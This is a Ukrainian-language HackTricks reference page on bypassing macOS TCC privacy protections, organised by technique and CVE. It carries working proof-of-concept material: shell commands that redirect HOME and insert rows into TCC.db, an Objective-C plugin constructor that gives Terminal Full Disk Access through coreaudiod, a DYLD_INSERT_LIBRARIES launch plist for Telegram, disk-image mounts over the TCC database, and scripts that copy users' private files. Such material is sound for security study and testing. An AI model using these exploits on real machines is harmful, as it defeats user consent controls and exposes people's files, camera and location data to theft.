# Обходи TCC

{{#include ../../../../../banners/hacktricks-training.md}}

## За функціональністю

### Обхід обмеження запису

Це не обхід, а просто принцип роботи TCC: **він не захищає від запису**. Якщо Terminal **не має доступу до читання Робочого столу користувача, він усе одно може записувати в нього**:
```shell-session
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % echo asd > Desktop/lalala
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % cat Desktop/lalala
asd
```
The **extended attribute `com.apple.macl`** додається до нового **file**, щоб надати **creators app** доступ для його читання.

### TCC ClickJacking

Можна **розмістити вікно поверх запиту TCC**, щоб змусити користувача **прийняти** його, не помітивши цього. PoC можна знайти в [**TCC-ClickJacking**](https://github.com/breakpointHQ/TCC-ClickJacking)**.**

<figure><img src="broken-reference" alt=""><figcaption><p><a href="https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg">https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg</a></p></figcaption></figure>

### TCC Request by arbitrary name

Зловмисник може **створювати apps з будь-якою назвою** (наприклад, Finder, Google Chrome...) у **`Info.plist`** і змушувати їх запитувати доступ до певного місця, захищеного TCC. Користувач думатиме, що цей доступ запитує легітимний application.\
Крім того, можна **видалити легітимний app з Dock і розмістити там fake one**, щоб після натискання користувачем на fake one (який може використовувати ту саму іконку) він міг викликати легітимний app, запитати дозволи TCC і виконати malware, змусивши користувача повірити, що доступ запитував легітимний app.

<figure><img src="https://lh7-us.googleusercontent.com/Sh-Z9qekS_fgIqnhPVSvBRmGpCXCpyuVuTw0x5DLAIxc2MZsSlzBOP7QFeGo_fjMeCJJBNh82f7RnewW1aWo8r--JEx9Pp29S17zdDmiyGgps1hH9AGR8v240m5jJM8k0hovp7lm8ZOrbzv-RC8NwzbB8w=s2048" alt="" width="375"><figcaption></figcaption></figure>

Більше інформації та PoC:


{{#ref}}
../../../macos-privilege-escalation.md
{{#endref}}

### SSH Bypass

За замовчуванням доступ через **SSH раніше мав "Full Disk Access"**. Щоб вимкнути його, потрібно, щоб SSH був у списку, але вимкнений (видалення зі списку не прибере ці привілеї):

![TCC Request by arbitrary name - SSH Bypass: За замовчуванням доступ через SSH мав "Full Disk Access". Щоб вимкнути його, потрібно, щоб SSH був у списку, але вимкнений (видалення зі списку...](<../../../../../images/image (1077).png>)

Тут можна знайти приклади того, як деякі **malwares змогли обійти цей захист**:

- [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)

> [!CAUTION]
> Зверніть увагу, що тепер для можливості увімкнути SSH потрібен **Full Disk Access**

### Handle extensions - CVE-2022-26767

Атрибут **`com.apple.macl`** надається files, щоб надати **певному application дозвіл на його читання.** Цей атрибут встановлюється під час **drag\&drop** файла на app або коли користувач **двічі клацає** файл, щоб відкрити його за допомогою **default application**.

Отже, користувач може **зареєструвати malicious app** для обробки всіх розширень і викликати Launch Services, щоб **відкрити** будь-який файл (тому malicious file отримає дозвіл на читання).

### iCloud

За допомогою entitlement **`com.apple.private.icloud-account-access`** можна зв’язатися з **`com.apple.iCloudHelper`** XPC service, який **надасть iCloud tokens**.

**iMovie** і **Garageband** мали цей entitlement та інші, які це дозволяли.

Щоб отримати більше **інформації** про exploit для **отримання icloud tokens** за допомогою цього entitlement, перегляньте доповідь: [**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=_6e2LhmxVc0)

### kTCCServiceAppleEvents / Automation

App із дозволом **`kTCCServiceAppleEvents`** зможе **керувати іншими Apps**. Це означає, що він зможе **зловживати дозволами, наданими іншим Apps**.

Докладніше про Apple Scripts:


{{#ref}}
macos-apple-scripts.md
{{#endref}}

Наприклад, якщо App має **Automation permission для `iTerm`**, як у цьому прикладі, **`Terminal`** має доступ до iTerm:

<figure><img src="../../../../../images/image (981).png" alt=""><figcaption></figcaption></figure>

#### Over iTerm

Terminal, який не має FDA, може викликати iTerm, що має його, і використовувати його для виконання дій:
```applescript:iterm.script
tell application "iTerm"
activate
tell current window
create tab with default profile
end tell
tell current session of current window
write text "cp ~/Desktop/private.txt /tmp"
end tell
end tell
```

```bash
osascript iterm.script
```
#### Через Finder

Або якщо застосунок має доступ через Finder, це може бути такий скрипт:
```applescript
set a_user to do shell script "logname"
tell application "Finder"
set desc to path to home folder
set copyFile to duplicate (item "private.txt" of folder "Desktop" of folder a_user of item "Users" of disk of home) to folder desc with replacing
set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alias)) as text
end tell
do shell script "rm " & POSIX path of (copyFile as alias)
```
## За поведінкою застосунку

### CVE-2020–9934 - TCC <a href="#c19b" id="c19b"></a>

Userland **tccd daemon** використовував змінну **`HOME`** **env** для доступу до бази даних користувачів TCC за адресою: **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**

Згідно з [цим дописом на Stack Exchange](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686), оскільки TCC daemon запускається через `launchd` у домені поточного користувача, можна **контролювати всі змінні середовища**, передані йому.\
Таким чином, **attacker міг установити змінну середовища `$HOME`** у **`launchctl`**, щоб указати на **контрольований** **directory**, **перезапустити** **TCC** daemon, а потім **безпосередньо змінити базу даних TCC**, надавши собі **кожне доступне TCC entitlement** без будь-якого запиту до кінцевого користувача.\
PoC:
```bash
# reset database just in case (no cheating!)
$> tccutil reset All
# mimic TCC's directory structure from ~/Library
$> mkdir -p "/tmp/tccbypass/Library/Application Support/com.apple.TCC"
# cd into the new directory
$> cd "/tmp/tccbypass/Library/Application Support/com.apple.TCC/"
# set launchd $HOME to this temporary directory
$> launchctl setenv HOME /tmp/tccbypass
# restart the TCC daemon
$> launchctl stop com.apple.tccd && launchctl start com.apple.tccd
# print out contents of TCC database and then give Terminal access to Documents
$> sqlite3 TCC.db .dump
$> sqlite3 TCC.db "INSERT INTO access
VALUES('kTCCServiceSystemPolicyDocumentsFolder',
'com.apple.Terminal', 0, 1, 1,
X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003',
NULL,
NULL,
'UNUSED',
NULL,
NULL,
1333333333333337);"
# list Documents directory without prompting the end user
$> ls ~/Documents
```
### CVE-2021-30761 - Нотатки

Notes мали доступ до захищених TCC місць, але коли створюється нотатка, вона **створюється в незахищеному місці**. Отже, можна було попросити Notes скопіювати захищений файл у нотатку (тобто в незахищене місце), а потім отримати доступ до файлу:

<figure><img src="../../../../../images/image (476).png" alt=""><figcaption></figcaption></figure>

### CVE-2021-30782 - Translocation

Бінарний файл `/usr/libexec/lsd` із бібліотекою `libsecurity_translocate` мав entitlement `com.apple.private.nullfs_allow`, який дозволяв йому створювати монтування **nullfs**, а також entitlement `com.apple.private.tcc.allow` із **`kTCCServiceSystemPolicyAllFiles`** для доступу до кожного файлу.

Можна було додати атрибут quarantine до "Library", викликати **`com.apple.security.translocation`** XPC service, після чого Library відображалася у **`$TMPDIR/AppTranslocation/d/d/Library`**, де всі документи всередині Library могли бути **доступними**.

### CVE-2023-38571 - Music & TV <a href="#cve-2023-38571-a-macos-tcc-bypass-in-music-and-tv" id="cve-2023-38571-a-macos-tcc-bypass-in-music-and-tv"></a>

**`Music`** має цікаву функцію: під час роботи вона **імпортує** файли, переміщені до **`~/Music/Music/Media.localized/Automatically Add to Music.localized`**, до "медіатеки" користувача. Крім того, вона викликає щось на кшталт: **`rename(a, b);`**, де `a` і `b` мають такі значення:

- `a = "~/Music/Music/Media.localized/Automatically Add to Music.localized/myfile.mp3"`
- `b = "~/Music/Music/Media.localized/Automatically Add to Music.localized/Not Added.localized/2023-09-25 11.06.28/myfile.mp3"`

Така **`rename(a, b);`** поведінка вразлива до **Race Condition**, оскільки можна помістити підроблений файл **TCC.db** у папку `Automatically Add to Music.localized`, а потім, коли створюється нова папка (b), скопіювати файл, видалити його та вказати шлях на **`~/Library/Application Support/com.apple.TCC`**/.
**Більше інформації** [**у writeup**](https://gergelykalman.com/CVE-2023-38571-a-macOS-TCC-bypass-in-Music-and-TV.html)


### SQLITE_SQLLOG_DIR - CVE-2023-32422

Якщо **`SQLITE_SQLLOG_DIR="path/folder"`** задано, це фактично означає, що **будь-яка відкрита db копіюється до цього шляху**. У цьому CVE цей механізм використали, щоб **записати** всередину **SQLite database**, яку має **відкрити процес із FDA до TCC database**, а потім зловжити **`SQLITE_SQLLOG_DIR`** за допомогою **symlink у назві файлу**, щоб під час **відкриття** цієї database користувацький **TCC.db був перезаписаний** відкритою database.\
**Більше інформації** [**у writeup**](https://gergelykalman.com/sqlol-CVE-2023-32422-a-macos-tcc-bypass.html) **і**[ **у talk**](https://www.youtube.com/watch?v=f1HA5QhLQ7Y&t=20548s).

### **SQLITE_AUTO_TRACE**

Якщо змінну середовища **`SQLITE_AUTO_TRACE`** встановлено, бібліотека **`libsqlite3.dylib`** почне **логувати** всі SQL-запити. Багато застосунків використовували цю бібліотеку, тому можна було логувати всі їхні SQLite-запити.

Кілька застосунків Apple використовували цю бібліотеку для доступу до інформації, захищеної TCC.
```bash
# Set this env variable everywhere
launchctl setenv SQLITE_AUTO_TRACE 1
```
### MTL_DUMP_PIPELINES_TO_JSON_FILE - CVE-2023-32407

Ця **env variable використовується фреймворком `Metal`**, який є залежністю для різних програм, зокрема `Music`, яка має FDA.

Встановлення: `MTL_DUMP_PIPELINES_TO_JSON_FILE="path/name"`. Якщо `path` є дійсним каталогом, bug спрацює, і ми можемо використати `fs_usage`, щоб побачити, що відбувається в програмі:

- буде виконано `open()` файлу з назвою `path/.dat.nosyncXXXX.XXXXXX` (X є випадковим)
- один або більше викликів `write()` запишуть вміст у файл (ми не контролюємо це)
- `path/.dat.nosyncXXXX.XXXXXX` буде перейменовано за допомогою `rename()` у `path/name`

Це запис у тимчасовий файл, після якого виконується **`rename(old, new)`**, **який не є безпечним.**

Він небезпечний, оскільки має **окремо розв'язати старий і новий шляхи**, що може зайняти певний час і бути вразливим до Race Condition. Для отримання додаткової інформації можна переглянути функцію `xnu` `renameat_internal()`.

> [!CAUTION]
> Отже, якщо привілейований процес перейменовує файл із папки, яку ви контролюєте, ви можете отримати RCE і змусити його звернутися до іншого файлу або, як у цьому CVE, відкрити файл, створений привілейованою програмою, і зберегти FD.
>
> Якщо під час доступу до папки, яку ви контролюєте, виконується rename, а ви змінили source file або маєте FD до нього, змініть destination file (або folder), щоб він вказував на symlink. Так ви зможете записувати в потрібне місце.

Це була атака в CVE. Наприклад, щоб перезаписати `TCC.db` користувача, ми можемо:

- створити `/Users/hacker/ourlink`, який вказуватиме на `/Users/hacker/Library/Application Support/com.apple.TCC/`
- створити каталог `/Users/hacker/tmp/`
- встановити `MTL_DUMP_PIPELINES_TO_JSON_FILE=/Users/hacker/tmp/TCC.db`
- trigger bug, запустивши `Music` із цією env variable
- перехопити `open()` для `/Users/hacker/tmp/.dat.nosyncXXXX.XXXXXX` (X є випадковим)
- тут ми також виконуємо `open()` цього файлу для запису й утримуємо file descriptor
- атомарно перемикати `/Users/hacker/tmp` і `/Users/hacker/ourlink` **у циклі**
- ми робимо це, щоб максимізувати шанси на успіх, оскільки race window є досить вузьким, але програш у race має незначні наслідки
- трохи зачекати
- перевірити, чи нам пощастило
- якщо ні, повторити все спочатку

Додаткова інформація: [https://gergelykalman.com/lateralus-CVE-2023-32407-a-macos-tcc-bypass.html](https://gergelykalman.com/lateralus-CVE-2023-32407-a-macos-tcc-bypass.html)

> [!CAUTION]
> Тепер, якщо спробувати використати env variable `MTL_DUMP_PIPELINES_TO_JSON_FILE`, apps не запускатимуться

### Apple Remote Desktop

Як root, ви могли б увімкнути цей service, і **ARD agent матиме full disk access**, що потім можна було б використати, щоб змусити його скопіювати нову **TCC user database**.

## By **NFSHomeDirectory**

TCC використовує database у HOME folder користувача для контролю доступу до ресурсів, специфічних для користувача, за адресою **$HOME/Library/Application Support/com.apple.TCC/TCC.db**.\
Тому, якщо користувач зможе перезапустити TCC із env variable `$HOME`, що вказує на **інший folder**, користувач зможе створити нову TCC database у **/Library/Application Support/com.apple.TCC/TCC.db** і змусити TCC надати будь-який TCC permission будь-якій app.

> [!TIP]
> Зверніть увагу, що Apple використовує setting, збережений у profile користувача в атрибуті **`NFSHomeDirectory`**, як **value `$HOME`**, тому, якщо ви скомпрометуєте application із permissions на зміну цього value (**`kTCCServiceSystemPolicySysAdminFiles`**), ви можете **weaponize** цю option за допомогою TCC bypass.

### [CVE-2020–9934 - TCC](#c19b) <a href="#c19b" id="c19b"></a>

### [CVE-2020-27937 - Directory Utility](#cve-2020-27937-directory-utility-1)

### CVE-2021-30970 - Powerdir

**Перший POC** використовує [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) і [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) для зміни **HOME folder** користувача.

1. Отримати _csreq_ blob для target app.
2. Розмістити fake _TCC.db_ file із необхідним access і _csreq_ blob.
3. Export Directory Services entry користувача за допомогою [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/).
4. Змінити Directory Services entry, щоб змінити home directory користувача.
5. Import зміненого Directory Services entry за допомогою [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/).
6. Зупинити _tccd_ користувача й reboot process.

Другий POC використовував **`/usr/libexec/configd`**, який мав `com.apple.private.tcc.allow` зі значенням `kTCCServiceSystemPolicySysAdminFiles`.\
Було можливо запустити **`configd`** з option **`-t`**, за допомогою якої attacker міг вказати **custom Bundle для завантаження**. Тому exploit **замінює** method зміни home directory користувача через **`dsexport`** і **`dsimport`** на **`configd` code injection**.

Для отримання додаткової інформації перегляньте [**оригінальний звіт**](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/).

## By process injection

Існують різні techniques для inject code у process і зловживання його TCC privileges:


{{#ref}}
../../../macos-proces-abuse/
{{#endref}}

Крім того, найпоширеніший process injection для bypass TCC виконується через **plugins (load library)**.\
Plugins — це додатковий code, зазвичай у формі libraries або plist, який **завантажується main application** і виконується в його context. Тому, якщо main application мала access до TCC restricted files (через granted permissions або entitlements), **custom code також матиме цей access**.

### CVE-2020-27937 - Directory Utility

Application `/System/Library/CoreServices/Applications/Directory Utility.app` мала entitlement **`kTCCServiceSystemPolicySysAdminFiles`**, завантажувала plugins із розширенням **`.daplug`** і **не мала hardened** runtime.

Щоб weaponize цей CVE, **`NFSHomeDirectory`** **змінюється** (із використанням попереднього entitlement), щоб отримати можливість **захопити TCC database користувача** для bypass TCC.

Для отримання додаткової інформації перегляньте [**оригінальний звіт**](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/).

### CVE-2020-29621 - Coreaudiod

Binary **`/usr/sbin/coreaudiod`** мав entitlements `com.apple.security.cs.disable-library-validation` і `com.apple.private.tcc.manager`. Перше **дозволяло code injection**, а друге надавало йому access для **керування TCC**.

Цей binary дозволяв завантажувати **third party plug-ins** із folder `/Library/Audio/Plug-Ins/HAL`. Тому було можливо **завантажити plugin і зловживати TCC permissions** за допомогою цього PoC:
```objectivec
#import <Foundation/Foundation.h>
#import <Security/Security.h>

extern void TCCAccessSetForBundleIdAndCodeRequirement(CFStringRef TCCAccessCheckType, CFStringRef bundleID, CFDataRef requirement, CFBooleanRef giveAccess);

void add_tcc_entry() {
CFStringRef TCCAccessCheckType = CFSTR("kTCCServiceSystemPolicyAllFiles");

CFStringRef bundleID = CFSTR("com.apple.Terminal");
CFStringRef pureReq = CFSTR("identifier \"com.apple.Terminal\" and anchor apple");
SecRequirementRef requirement = NULL;
SecRequirementCreateWithString(pureReq, kSecCSDefaultFlags, &requirement);
CFDataRef requirementData = NULL;
SecRequirementCopyData(requirement, kSecCSDefaultFlags, &requirementData);

TCCAccessSetForBundleIdAndCodeRequirement(TCCAccessCheckType, bundleID, requirementData, kCFBooleanTrue);
}

__attribute__((constructor)) static void constructor(int argc, const char **argv) {

add_tcc_entry();

NSLog(@"[+] Exploitation finished...");
exit(0);
```
Для отримання додаткової інформації перегляньте [**оригінальний звіт**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/).

### Device Abstraction Layer (DAL) Plug-Ins

Системні застосунки, які відкривають потік камери через Core Media I/O (застосунки з **`kTCCServiceCamera`**), завантажують **у процесі ці плагіни**, розташовані в `/Library/CoreMediaIO/Plug-Ins/DAL` (не обмежені SIP).

Достатньо просто зберегти там бібліотеку зі звичайним **constructor**, щоб виконати **inject code**.

Кілька застосунків Apple були вразливими до цього.

### Firefox

Застосунок Firefox мав entitlements `com.apple.security.cs.disable-library-validation` і `com.apple.security.cs.allow-dyld-environment-variables`:
```xml
codesign -d --entitlements :- /Applications/Firefox.app
Executable=/Applications/Firefox.app/Contents/MacOS/firefox

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.cs.allow-unsigned-executable-memory</key>
<true/>
<key>com.apple.security.cs.disable-library-validation</key>
<true/>
<key>com.apple.security.cs.allow-dyld-environment-variables</key><true/>
<true/>
<key>com.apple.security.device.audio-input</key>
<true/>
<key>com.apple.security.device.camera</key>
<true/>
<key>com.apple.security.personal-information.location</key>
<true/>
<key>com.apple.security.smartcard</key>
<true/>
</dict>
</plist>
```
Більше інформації про те, як легко це експлуатувати, дивіться у [**оригінальному звіті**](https://wojciechregula.blog/post/how-to-rob-a-firefox/).

### CVE-2020-10006

Бінарний файл `/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl` мав entitlements **`com.apple.private.tcc.allow`** і **`com.apple.security.get-task-allow`**, що дозволяло інжектити код у процес і використовувати привілеї TCC.

### CVE-2023-26818 - Telegram

Telegram мав entitlements **`com.apple.security.cs.allow-dyld-environment-variables`** і **`com.apple.security.cs.disable-library-validation`**, тому його можна було зловживати для **отримання доступу до його дозволів**, наприклад для запису відео камерою. [**Payload можна знайти у writeup**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/).

Зверніть увагу, що для використання env-змінної завантаження бібліотеки було створено **custom plist** для інжекту цієї бібліотеки, а для її запуску використано **`launchctl`**:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.telegram.launcher</string>
<key>RunAtLoad</key>
<true/>
<key>EnvironmentVariables</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/tmp/telegram.dylib</string>
</dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Telegram.app/Contents/MacOS/Telegram</string>
</array>
<key>StandardOutPath</key>
<string>/tmp/telegram.log</string>
<key>StandardErrorPath</key>
<string>/tmp/telegram.log</string>
</dict>
</plist>
```

```bash
launchctl load com.telegram.launcher.plist
```
## Через open-виклики

Можна викликати **`open`**, навіть перебуваючи в sandbox

### Terminal Scripts

Досить часто Terminal надають **Full Disk Access (FDA)**, принаймні на комп'ютерах, якими користуються технічні спеціалісти. Також за його допомогою можна викликати скрипти **`.terminal`**.

Скрипти **`.terminal`** — це plist-файли, подібні до цього, з командою для виконання в ключі **`CommandString`**:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>CommandString</key>
<string>cp ~/Desktop/private.txt /tmp/;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
```
Застосунок міг записати термінальний скрипт у таке розташування, як `/tmp`, і запустити його за допомогою команди, наприклад:
```objectivec
// Write plist in /tmp/tcc.terminal
[...]
NSTask *task = [[NSTask alloc] init];
NSString * exploit_location = @"/tmp/tcc.terminal";
task.launchPath = @"/usr/bin/open";
task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",
exploit_location]; task.standardOutput = pipe;
[task launch];
```
## By mounting

### CVE-2020-9771 - mount_apfs TCC bypass and privilege escalation

**Будь-який користувач** (навіть непривілейований) може створити та змонтувати snapshot Time Machine і **отримати доступ до ВСІХ файлів** цього snapshot.\
**Єдиний привілей**, необхідний для цього, полягає в тому, що використовуваний застосунок (наприклад, `Terminal`) повинен мати доступ **Full Disk Access** (FDA) (`kTCCServiceSystemPolicyAllfiles`), який має надати адміністратор.
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
Детальніше пояснення можна [**знайти в оригінальному звіті**](https://theevilbit.github.io/posts/cve_2020_9771/)**.**

### CVE-2021-1784 & CVE-2021-30808 - Монтування поверх TCC file

Навіть якщо файл TCC DB захищений, можна було **змонтувати поверх каталогу** новий файл TCC.db:
```bash
# CVE-2021-1784
## Mount over Library/Application\ Support/com.apple.TCC
hdiutil attach -owners off -mountpoint Library/Application\ Support/com.apple.TCC test.dmg

# CVE-2021-1784
## Mount over ~/Library
hdiutil attach -readonly -owners off -mountpoint ~/Library /tmp/tmp.dmg
```

```python
# This was the python function to create the dmg
def create_dmg():
os.system("hdiutil create /tmp/tmp.dmg -size 2m -ov -volname \"tccbypass\" -fs APFS 1>/dev/null")
os.system("mkdir /tmp/mnt")
os.system("hdiutil attach -owners off -mountpoint /tmp/mnt /tmp/tmp.dmg 1>/dev/null")
os.system("mkdir -p /tmp/mnt/Application\ Support/com.apple.TCC/")
os.system("cp /tmp/TCC.db /tmp/mnt/Application\ Support/com.apple.TCC/TCC.db")
os.system("hdiutil detach /tmp/mnt 1>/dev/null")
```
Перегляньте **повний exploit** у [**оригінальному описі**](https://theevilbit.github.io/posts/cve-2021-30808/).

### CVE-2024-40855

Як пояснюється в [оригінальному описі](https://www.kandji.io/blog/macos-audit-story-part2), цей CVE використовував `diskarbitrationd`.

Функція `DADiskMountWithArgumentsCommon` із публічного framework `DiskArbitration` виконувала перевірки безпеки. Однак їх можна обійти, безпосередньо викликавши `diskarbitrationd`, а отже використовуючи елементи `../` у шляху та symlink-и.

Це дозволяло зловмиснику виконувати довільні mount-и в будь-якому місці, зокрема поверх TCC database, завдяки entitlement `com.apple.private.security.storage-exempt.heritable` процесу `diskarbitrationd`.

### asr

Tool **`/usr/sbin/asr`** дозволяв копіювати весь диск і монтувати його в іншому місці, обходячи захист TCC.

### Location Services

Існує третя TCC database у **`/var/db/locationd/clients.plist`**, яка вказує clients, яким дозволено **отримувати доступ до location services**.\
Folder **`/var/db/locationd/` не був захищений від монтування DMG**, тому можна було змонтувати власний plist.

## Через startup apps


{{#ref}}
../../../../macos-auto-start-locations.md
{{#endref}}

## Через grep

У багатьох випадках files зберігатимуть sensitive information, як-от email-и, phone numbers, messages... у незахищених місцях (що Apple вважає vulnerability).

<figure><img src="../../../../../images/image (474).png" alt=""><figcaption></figcaption></figure>

## Synthetic Clicks

Це більше не працює, але [**раніше працювало**](https://twitter.com/noarfromspace/status/639125916233416704/photo/1)**:**

<figure><img src="../../../../../images/image (29).png" alt=""><figcaption></figcaption></figure>

Ще один спосіб із використанням [**подій CoreGraphics**](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf):

<figure><img src="../../../../../images/image (30).png" alt="" width="563"><figcaption></figcaption></figure>

## Посилання

- [**https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8**](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
- [**https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/**](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
- [**20+ Ways to Bypass Your macOS Privacy Mechanisms**](https://www.youtube.com/watch?v=W9GxnP8c8FU)
- [**Knockout Win Against TCC - 20+ NEW Ways to Bypass Your MacOS Privacy Mechanisms**](https://www.youtube.com/watch?v=a9hsxPdRxsY)

{{#include ../../../../../banners/hacktricks-training.md}}
